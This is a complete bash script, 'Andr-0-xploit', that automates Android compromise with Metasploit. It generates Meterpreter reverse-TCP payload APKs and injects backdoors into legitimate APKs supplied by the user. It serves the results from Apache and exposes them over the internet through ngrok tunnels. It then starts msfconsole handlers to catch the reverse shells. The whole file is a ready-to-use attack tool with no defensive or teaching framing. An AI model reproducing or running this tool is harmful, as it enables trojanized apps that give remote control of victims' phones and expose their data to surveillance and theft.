#!/bin/bash


#***********************************************************************************************************************#
# 					     Andr-0-xploit Framework - Version 1.0					#
# Andr-0-xploit is a framework that create and generate apk payload and embedded apk payload to hack android devices.	#
#															#
#		Developed BY 	: Gaurav Kumawat									#
#		Banner Credit	: Saurabh Jajoria									#
#		Special Thanks	: Dheeraj Madhurkar(Mentor)								#
#															#
# Andr-0-xploit is a open source tool if you modify it or add something in it then please give a copy to me.	     	#
#***********************************************************************************************************************#


#Plain Text
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[3;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
Close='\033[0m'

#Bold Text
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

Banner()
{
clear

                                    echo -e " ${Red}                      An                        An               ${close} "
                                    echo -e " ${Red}                     tA                         And              ${close} "
                                    echo -e " ${Red}                    itA                         Andr             ${close} "
                                    echo -e " ${Red}                    itAn                      itAndr             ${close} "
                                    echo -e " ${Red}                    itAndr-0-XploitAndr-0-XploitAnd              ${close} "
                                    echo -e " ${Red}                     tAndr-0-XploitAndr-0-XploitAn               ${close} "
                                    echo -e " ${Red}                    itAndr-0-XploitAndr-0-XploitAnd              ${close} "
                                    echo -e " ${Red}                   oitAndr-0-XploitAndr-0-XploitAndr             ${close} "
                                    echo -e " ${Red}                  loitAndr-0-${close}${Green}Xp${close}${Red}loitAndr-0-${close}${Green}Xp${close}${Red}loitAndr- ${close} "
                                    echo -e " ${Red}                 ploitAndr-0-XploitAndr-0-XploitAndr-0           ${close} "
                                    echo -e " ${Red}                XploitAndr-0-XploitAndr-0-XploitAndr-0           ${close} "
                                    echo -e " ${Red}                XploitAndr-0-XploitAndr-0-XploitAndr-0           ${close} "
                                    echo                                         
                                    echo -e " ${Red}       itAndr-  XploitAndr-0-XploitAndr-0-XploitAndr-0  oitAnd   ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr-0-XploitAndr-0-XploitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr${Yellow}*******************${Close}${Red}oitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr${Yellow}|${Close} ${UYellow}DEVELOPED BY:${Close}  ${Yellow} |${Close}${Red}oitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr${Yellow}| ${BCyan}Gaurav Kumawat${Close} ${Yellow} |${Close}${Red}oitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr${Yellow}|${Close} ${UYellow}BANNER CREDIT:${Close} ${Yellow} |${Close}${Red}oitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr${Yellow}| ${BCyan}Saurabh Jajoria${Close} ${Yellow}|${Close}${Red}oitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr${Yellow}*******************${Close}${Red}oitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr-0-XploitAndr-0-XploitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}      oitAndr-0 XploitAndr-0-XploitAndr-0-XploitAndr-0 loitAndr  ${close} "
                                    echo -e " ${Red}       itAndr-  XploitAndr-0-XploitAndr-0-XploitAndr-0  oitAnd   ${close} "
                                    echo -e " ${Red}                XploitAndr-0-XploitAndr-0-XploitAndr-0           ${close} "
                                    echo -e " ${Red}                XploitAndr-0-XploitAndr-0-XploitAndr-0           ${close} "
                                    echo -e " ${Red}                  loitAndr-0-XploitAndr-0-XploitAndr             ${close} "
                                    echo -e " ${Red}                        dr-0-Xplo     r-0-Xploit                 ${close} "
                                    echo -e " ${Red}                        dr-0-Xplo     r-0-Xploit                 ${close} "
                                    echo -e " ${Red}                        dr-0-Xplo     r-0-Xploit                 ${close} "
                                    echo -e " ${Red}                        dr-0-Xplo     r-0-Xploit                 ${close} "
                                    echo -e " ${Red}                        dr-0-Xplo     r-0-Xploit                 ${close} "
                                    echo -e " ${Red}                         r-0-Xpl       -0-Xploi                  ${close} "
 
echo -e "${Purple}    _    _   _ ____  ____        ___      __  ______  _     ___ ___ _____    ${close} "
echo -e "${Purple}   / \  | \ | |  _ \|  _ \      / _ \     \ \/ /  _ \| |   / _ \_ _|_   _|   ${close} "
echo -e "${Purple}  / _ \ |  \| | | | | |_) |____| | | |_____\  /| |_) | |  | | | | |  | |     ${close} " 
echo -e "${Purple} / ___ \| |\  | |_| |  _ <_____| |_| |_____/  \|  __/| |__| |_| | |  | |     ${close} "
echo -e "${Purple}/_/   \_\_| \_|____/|_| \_\     \___/     /_/\_\_|   |_____\___/___| |_|     ${close} "
echo -e "${Green}                                                             Version:1.0     ${close} "
echo
}


dependencies()		#<Check all dependencies to run the script>
{
	msfconsole=$(which msfconsole)
	msfvenom=$(which msfvenom)
	apktool=$(which apktool)
	zipalign=$(which zipalign)
	xterm=$(which xterm)

	echo -e "${UYellow}*CHECKING DEPENDENCIES*${Close}"
	if [ -z "$msfconsole" ] && [ -z "$msfvenom" ];
	then
		echo -e "${Red}[ X ] Metasploit-Framework........ [ NOT INSTALLED ]${Close}"
		a=0
	else
		echo -e "${Green}[ ✔ ] Metasploit-Framework........ [ INSTALLED ]${Close}"
		sleep 1
		echo -e "${Blue}	|${Close}"
		echo -e "${Blue}	*---${Close} ${Green}[ ✔ ] msfconsole..... [ INSTALLED ]${Close}"
		sleep 1
		echo -e "${Blue}	|${Close}"
		echo -e "${Blue}	*---${Close} ${Green}[ ✔ ] msfvenom....... [ INSTALLED ]${Close}"
		a=1
	fi
	sleep 1

	if [ -z "$apktool" ]
	then
		echo -e "${Red}[ X ] Apktool..................... [ NOT INSTALLED ]${Close}"
		c=0
	else
		echo -e "${Green}[ ✔ ] Apktool..................... [ INSTALLED ]${Close}"
		c=1
	fi
	sleep 1

	if [ -z "$zipalign" ]
	then
		echo -e "${Red}[ X ] Zipalign.................... [ NOT INSTALLED ]${Close}"
		d=0
	else
		echo -e "${Green}[ ✔ ] Zipalign.................... [ INSTALLED ]${Close}"
		d=1
	fi
	sleep 1

	if [ -z "$xterm" ]
	then
		echo -e "${Red}[ X ] Xterm....................... [ NOT INSTALLED ]${Close}"
		e=0
	else
		echo -e "${Green}[ ✔ ] Xterm....................... [ INSTALLED ]${Close}"
		e=1
	fi
	
	if [ "$a" == 0 ] || [ "$b" == 0 ] || [ "$c" == 0 ] || [ "$d" == 0 ] || [ "$e" == 0 ];
	then
		echo
		echo -e "${Red}Some of the dependencies are missing.${Close} Still you can run this script for testing purpose..."
		echo -en "Do you want to install them now [y/n]: "
		read inst_dep
		case $inst_dep in
			[Yy][Ee][Ss]|[Yy])
				check_internet
				install_dependencies
				;;
			[Nn][Oo]|[Nn])
				echo
				echo -e "${Red}You are running this script with some missing dependencies. Don't blame me for any problems you face${Close} ¯\_(ツ)_/¯"
				;;
		esac
	fi
	echo 
	echo -e "${Yellow}All Set!!! You are ready to go...${Close}"
	read -n 1 -s -r -p "Press any key to continue..."
	echo
	clear
}

install_dependencies()		#<Install dependencies>
{
	if [ "$a" == 0 ] || [ "$b" == 0 ];
	then
		echo
		echo -e "${Purple}Installing Metasploit-Framework...${Close}"
		echo
		apt install metasploit-framework
	fi

	if [ $c == 0 ]
	then
		echo
		echo -e "${Purple}Installing Apktool...${Close}"
		echo
		apt install apktool
	fi

	if [ $d == 0 ]
	then
		echo
		echo -e "${Purple}Installing Zipalign...${Close}"
		echo
		apt install zipalign
	fi

	if [ $e == 0 ]
	then
		echo
		echo -e "${Purple}Installing Xterm...${Close}"
		echo
		apt install xterm
	fi
}

check_internet()	#<Check whether internet is connected or not>
{
	echo
	echo
	echo -e "${Purple}*Checking Internet Connection*${Close}"
	ping -c 1 google.com > /dev/null 2>&1
	if [[ "$?" != 0 ]]
	then
		echo -e "${Blue}Internet:${Close} ${Red}[ NOT CONNECTED ]${Close}"
		echo -e "${Red}This Script needs internet to download files${Close}"
		echo
		sleep 1
		exit
	else
		echo -e "${Blue}Internet:${Close} ${Green}[ CONNECTED ]${Close}"
	fi
}


postgresql()  #<Function to check if postgresql DB is active or not and start it if inactive>
{
	postgresql_status=$(systemctl status postgresql | grep -i active | awk '{print $2}')
	if [ $postgresql_status == active ]
	then
		echo -e "${Blue}Postgresql DB : [${Close} ${Green}active${Close} ${Blue}]${Close}"
	else
		echo -e "${Blue}Postgresql DB : [${Close}${Red} inactive ${Close}${Blue}]${Close}"
		echo -e "\033[33;5mStarting postgresql DB... please wait\033[0m"
		systemctl restart postgresql
		postgresql_status2=$(systemctl status postgresql | grep -i active | awk '{print $2}')
		if [ $postgresql_status2 == active ]
		then
			echo -e "${Blue}Postgresql DB : [${Close} ${Green} active ${Close} ${Blue}]${Close}"
		else
			echo -e "${Red}There is a porblem starting postgresql DB, msfconsole will work slow.${Close}"
			echo -e "${Red}You can manually start postgresql using command:${Close} ${Green}systemctl restart postgresql${Close}"
		fi
	fi
}


apache() #<start apache web server if inactive>
{
	apache=$(systemctl status apache2 | grep -i "active" | awk '{print $2}')
	if [ $apache == inactive ]
	then
		systemctl restart apache2
	fi
}

Menu()  #<Main Menu of the Framework>
{
	echo -e "${UYellow}MENU${Close}"
	echo -e "${BBlue}[${Close}${BRed}!${close}${BBlue}]Network Type:${Close} "

	echo "                1) LAN/WLAN (Local Area Network)"  #<For same network attack>
	echo "                2) WAN (Public Facing Network)"    #<Over the internet attack> 
	echo "                0) Exit"
	echo 
	echo -ne "${BBlue}Andr-0-xploit > ${Close}"
	read net
	case $net in
		1)
			Local_Menu  #<Call Local_Menu function>
			;;
		2)
			Wan_Menu    #<Call Wan_Menu function>
			;;
		0)
			exit
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear
			Menu		#<Reload Menu function>
			;;
	esac
}

Interface()    #<Show all Active Interfaces list of system>
{
	clear
	echo -e "${UYellow}INTERFACE${Close}"
	echo -e "		 ${Green}Active Interfaces: ${Close}"
	num=$(ifconfig | grep -i "running" | grep -v "lo:" | awk '{print NR ". " $s}' | cut -d: -f 1 | wc -l)
	i=1
	while [ $i -le $num ]    #<Condition for printing active interfaces>
	do
		inr=$(ifconfig | grep -i "running" | grep -v "lo:" | awk '{print NR ". " $s}' | cut -d: -f 1 | grep $i | awk '{print}')
		echo "		 		  $inr"
		i=$(($i + 1))
	done

	echo
	echo -ne "${BBlue}[${Close}${BRed}!${Close}${BBlue}]Set Interface: ${Close}"
	read a                     #<Read Input for the interface>
	if [ $a -le $num ]         #<Active IP printing condition>
	then
	inet=$(ifconfig | grep -i "running" | grep -v "lo:" |  awk '{print NR ". " $s}' | cut -d: -f 1 | grep $a | awk '{print $2}')
	ip=$(ifconfig $inet | grep inet | grep -v inet6 | awk '{print $2}')
	echo -e "	       ${Green}Internal IP:${Close} $ip"
	else
		echo -e "${Red}**********************************************"
		echo -e "*  Invalid Choice. Make Your Choice Correct  *"
		echo -e "**********************************************${Close}"
		sleep 2
		clear
		Interface		#<Reload Interface function>
	fi

}

Local_Menu()   #<Display menu for Local LAN/WLAN>
{
	Interface              #<Call Interface function>
	echo
	echo "                      1) Generate Payload (MSFvenom)"
	echo "                      2) APK Backdoor (Reverse Engg)"
	echo "                      99) Main Menu"
	echo
	Local_Menu_Choice      #<Call Local_Menu_Choice function>
}

Local_Menu_Choice()  #<Local_Menu Choice function to make choice>
{
	echo -ne "${BBlue}Andr-0-xploit(${Close}${BRed}LAN/WLAN${Close}${BBlue}) > ${Close}"
	read Local_choice
	case $Local_choice in
		1)
			Local_Generate_Payload		#<Call Local_Generate_Payload function>
			;;
		2)
			Local_APK_Backdoor		#<Call Local_APK_Backdoor function>
			;;
		99)
			Menu				#<Call Menu function>
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear
			Local_Menu		#<Reload Local_Menu function>
			;;
	esac
}

Local_Handler_TCP()  #<Reverse Connection Handler for exploit in loacl network>
{
	postgresql	#<Call postgresql function>
	rm -rf *.rc 
	echo "use multi/handler
	set PAYLOAD android/meterpreter/reverse_tcp
	set LHOST $ip
	set LPORT $Local_LPORT
	exploit -j" > $ip.rc
	xterm -e "msfconsole -r $ip.rc"
	clear
	Menu		#<Call Menu function>
}

Local_Generate_Payload()  #<Generate APK Payload to use in local network>
{
	clear
	echo -e "${UYellow}LOCAL GENERATE PAYLOAD${Close}"
	echo -ne "${BBlue}Andr-0-xploit(${Close}${BRed}LAN/WLAN:Payload${Close}${BBlue}) > ${Close}${Green}Enter LPORT> ${Close}"
	read Local_LPORT
	echo -e "\033[31;5mGenerating malicious APK using...\033[0m LHOST=$ip; LPORT=$Local_LPORT\033"
	msfvenom -platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$Local_LPORT R -o /var/www/html/Local_Payload.apk		#<Generate APK Payload to use in local network>
	echo
	echo -e "${Green}Download your APK: http://$ip/Local_Payload.apk${Close}"

	apache			#<Call apache function>

	echo -e "${Green}Payload APK Generated Successfully${Close}"
	echo -en "${Red}Start exploit handler [y/n]:${Close} "
	read Local_Generate_Payload_Choice
	echo -e "${BBlue}Andr-0-xploit(${Close}${BRed}LAN/WLAN:Payload${Close}${BBlue}) > ${Close}"

	case $Local_Generate_Payload_Choice in
		[Yy][Ee][Ss]|[Yy])
			Local_Handler_TCP	#<Call Local_Handler_TCP function>
			;;
		[Nn][Oo]|[Nn])
			clear
			echo 
			echo "Going back to main menu"
			sleep 2
			clear
			Menu			#<Call Menu function>
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear
			Menu			#<Call Menu function>
			;;
	esac
}

Local_APK_Backdoor()  #<APK Backdoor Function to generate backdoor in APK to use in local network>
{
	clear
	echo -e "${UYellow}LOCAL APK BACKDOOR${Close}"
	echo
	echo -ne "${BBlue}Andr-0-xploit (${Close}${BRed}Payload:APK_Backdoor${Close}${BBlue}) > ${Close}${Green}Enter path to original APK > ${Close}"

	read l_path					#/This part is to rename /
	l_name=$(basename $l_path)			#/the name of APK from   /
	l_name2=${l_name::-4}				#/<APK Name> to 	 /
	l_backdoor_apk=$l_name2'_backdoor.apk'		#/<APK NAME>_backdoor.apk/

	l_ext=$(echo $l_name | rev)			#/This part it to confirm/
	l_ext2=${l_ext::4}				#/That file extension    /
	l_ext3=$(echo $l_ext2 | rev)			#/must be .apk		 /

	if [ $l_ext3 == .apk ]
	then
	
	echo -ne "${BBlue}Andr-0-xploit (${Close}${BRed}Payload:APK_Backdoor${Close}${BBlue}) > ${Close}${Green}Enter LPORT > ${Close}"		
	read Local_LPORT
	echo "Initialising Process..."
	echo
	msfvenom -x $l_path -platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$Local_LPORT R &> .Andr-0-xploit-error.txt               #<Generate backdoor in APK>

	l_output=$(cat .Andr-0-xploit-error.txt | grep -i aligning | awk '{print $3}')
	mv $l_output /var/www/html/$l_backdoor_apk
	cat .Andr-0-xploit-error.txt | sed '/Error/d'
	dir_apk=$(cat .Andr-0-xploit-error.txt | grep -i aligning | awk '{print $3}' | cut -d/ -f 1,2,3)
	rm -rf $dir_apk			#<Remove temp files>

	echo
	echo -e "${Green}	Backdoor APK Generated at:${Close} /var/www/html/$l_backdoor_apk"
	echo -e "${Green}	Download your APK from:${Close} http://$ip/$l_backdoor_apk"
	rm .Andr-0-xploit-error.txt
	apache 				 	#<Call apache function>
	
	echo -en "${Red}	Start exploit handler[y/n]:${Close} "
	read Local_APK_Backdoor_Choice
	case $Local_APK_Backdoor_Choice in
		[Yy][Ee][Ss]|[Yy])
			Local_Handler_TCP	#<Call Local_Handler_TCP function>
			;;
		[Nn][Oo]|[Nn])
			clear
			echo 
			echo "Going back to main menu"
			sleep 2
			Menu			#<Call Menu function>
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear
			Menu			#<Call Menu function>
			;;	
	esac

	else
	echo
	echo -e "${Red}*************************"
	echo -e "*  Enter apk file only  *"
	echo -e "*************************${Close}"
	sleep 2
	APK_Backdoor		#<Reload APK_Backdoor function>
	fi
}

Wan_Menu()		#<Display Menu for WAN>
{
	echo 
	echo "                      1) Generate Payload (MSFvenom)"
	echo "                      2) APK Backdoor (Reverse Engg)"
	echo "                      99) Main Menu"
	echo	
	Wan_Menu_Choice			#<Call Wan_Menu_Choice>
}

Wan_Menu_Choice()	#<Choice Menu for WAN to make choice>
{
	echo -ne "${BBlue}Andr-0-xploit(${Close}${BRed}WAN${Close}${BBlue}) > ${Close}"
	read Wan_choice
	case $Wan_choice in
		1)
			Wan_Generate_Payload		#<Call Wan_Generate_Payload function>
			;;
		2)
			Wan_APK_Backdoor		#<Call Wan_APK_Backdoor function>
			;;
		99)
			Menu				#<Call Menu function>
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear
			echo -e "${UYellow}WAN MENU${Close}"
			Wan_Menu			#<Reload Wan_Menu function>
			;;
	esac
}

ngrok()		#<This function check all ngrok dependencies which will be used for WAN attack (Over the internet attack)>
{
	echo -e "${Purple}*Checking Dependencies*${Close}"
	ngrok=$(find / -iname ngrok)
	ngrok_path=${ngrok%/*}

	if [ -z "$ngrok_path" ]
	then
		echo -e "${Red}ngrok not found${Close}"
		echo -e "${Green}Downloading ngrok...${Close}"
		echo
		wget -P /var/www/ https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
		echo "ngrok downloaded at: /var/www/"
		unzip /var/www/ngrok-stable-linux-386.zip -d /var/www/
		rm -f /var/www/ngrok-stable-linux-386.zip
	else
		echo -e "${Green}ngrok is already present at:${Close} $ngrok"
	fi

	ngrok_authtoken=$(cat ~/.ngrok2/ngrok.yml | grep -i "authtoken" | awk '{print $2}') 		#<Checking for authtoken>
	if [ -z "$ngrok_authtoken" ]
	then
		echo
		echo -e "${Red}ngrok authtoken not found${Close}"
		echo -e "${Purple}Login/Signup to your ngrok account and copy your authtoken from there${Close}"
		echo -e "${Green}Login:${Close} https://dashboard.ngrok.com/user/login"
		echo -e "${Green}Signup:${Close} https://dashboard.ngrok.com/user/signup"
		exit 1

	else
		echo -e "${Green}authtoken found${Close} ${Red}but If your authtoken is incorrect or invalid then further processing won't work.${Close}"
		echo "authtoken: $ngrok_authtoken
tunnels:
 first:
  addr: 80
  proto: http
 second:
  addr: $Wan_LPORT
  proto: tcp" > ~/.ngrok2/ngrok.yml
	fi

  	xterm -e "$ngrok_path/./ngrok start --all" &
	sleep 10

	ngrok_tcp_port=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p' | rev | cut -d: -f 1 | rev)

	ngrok_http_tunnel=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"http:..([^"]*).*/\1/p')
}

Wan_Generate_Payload()		#<Function for generating Payload APK to use over the internet>
{
	clear
	echo -e "${UYellow}GENERATE PAYLOAD${Close}"
	echo -ne "${BBlue}Andr-0-xploit(${Close}${BRed}WAN:Payload${Close}${BBlue}) >${Close}${Green} Enter LPORT > ${Close}"
	read Wan_LPORT
	echo
	echo -e "Initialising Process..."
	ngrok 			#<Call ngrok function>
	echo
	msfvenom -platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST="0.tcp.ngrok.io" LPORT=$ngrok_tcp_port R -o /var/www/html/Payload_APK_over_internet.apk			#<Generate APK payload to use over the internet>
	echo
	echo -e "				 ${Green}Download your APK:${Close} http://$ngrok_http_tunnel/Payload_APK_over_internet.apk"
	

	echo -e "${Green}			         APK Generated Successfully${Close}"
	apache
	echo -en "${Red}		  	         Start exploit handler [y/n]:${Close} "

	read Generate_Payload_Choice
	echo -e "${BBlue}Andr-0-xploit(${Close}${BRed}WAN:Exploit_Handler${Close}${BBlue}) > ${Close}"
	case $Generate_Payload_Choice in
		[Yy][Ee][Ss]|[Yy])
			Wan_Handler_TCP		#<Call Wan_Handler_TCP>
			;;
		[Nn][Oo]|[Nn])
			clear
			echo 
			echo "Going back to main menu"
			sleep 2
			Menu			#<Call Menu function>
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear
			Menu			#<Call Menu function>
			;;
	esac
}

Wan_APK_Backdoor()     #<Function for generating backdoor in APK to use over the internet>
{
	
	clear
	echo -e "${UYellow}APK BACKDOOR${Close}"
	echo
	echo -ne "${BBlue}Andr-0-xploit (${Close}${BRed}Payload:APK_Backdoor${Close}${BBlue}) > ${Close}${Green}Enter path to original APK > ${Close}"

	read w_path                                 #/This part is to remane	/
	w_name=$(basename $w_path)		    #/the APK from original	/
	w_name2=${w_name::-4}			    #/APK Name to		/
	w_backdoor_apk=$w_name2'_backdoor.apk'      #/<APK_Name>_backdoor.apk	/

	w_ext=$(echo $w_name | rev)		    #/This part is to confirm	/
	w_ext2=${w_ext::4}			    #/the extension of file 	/
	w_ext3=$(echo $w_ext2 | rev)		    #/must be .apk		/

	if [ $w_ext3 == .apk ]
	then
	echo -ne "${BBlue}Andr-0-xploit (${Close}${BRed}Payload:APK_Backdoor${Close}${BBlue}) > ${Close}${Green}Enter LPORT > ${Close}"
	read Wan_LPORT
	echo -e "Initialising Process..."
	echo
	ngrok 				#<Call ngrok function>
	msfvenom -x $w_path -platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST="0.tcp.ngrok.io" LPORT=$ngrok_tcp_port R &> .Andr-0-xploit-error.txt               #<Generate backdoor in APK>
	
	w_output=$(cat .Andr-0-xploit-error.txt | grep -i aligning | awk '{print $3}')
	mv $w_output /var/www/html/$w_backdoor_apk
	cat .Andr-0-xploit-error.txt | sed '/Error/d'
	dir_apk=$(cat .Andr-0-xploit-error.txt | grep -i aligning | awk '{print $3}' | cut -d/ -f 1,2,3)
	rm -rf $dir_apk			#<Remove temp files>

	echo -e "${Green}		Backdoor APK Generated at:${Close} /var/www/html/$w_backdoor_apk"
	echo -e "${Green}		Download your APK from:${Close} http://$ngrok_http_tunnel/$w_backdoor_apk"
	apache
	rm .Andr-0-xploit-error.txt

	echo -en "${Red}		Start exploit handler[y/n]:${Close} "
	read Wan_APK_Backdoor_Choice
	case $Wan_APK_Backdoor_Choice in
		[Yy][Ee][Ss]|[Yy])
			Wan_Handler_TCP    #<Call Wan_Handler_TCP function>
			;;
		[Nn][Oo]|[Nn])
			clear
			echo 
			echo "Going back to main menu"
			sleep 2
			Menu     #<Call Menu function>
			;;
		*)
			echo -e "${Red}**********************************************"
			echo -e "*  Invalid Choice. Make Your Choice Correct  *"
			echo -e "**********************************************${Close}"
			sleep 2
			clear 
			Menu     #<Call Menu function>
			;;	
	esac

	else
	echo
	echo -e "${Red}*************************"
	echo -e "*  Enter apk file only  *"
	echo -e "*************************${Close}"
	sleep 2
	Wan_APK_Backdoor   #<Call Wan_APK_Backdoor function>
	fi
}

Wan_Handler_TCP()  #<Reverse Connection Handler for exploit>
{
	postgresql #<Call postgresql function>
	rm -rf *.rc 
	echo "use multi/handler
	set PAYLOAD android/meterpreter/reverse_tcp
	set LHOST 127.0.0.1
	set LPORT $Wan_LPORT
	exploit -j" > reverse.rc
	xterm -e "msfconsole -r reverse.rc"
	clear
	Menu
}

clear		#<Clear screen>
dependencies	#<Call dependencies function>
clear
Banner		#<Call Banner function>
Menu 		#<Call Menu function>
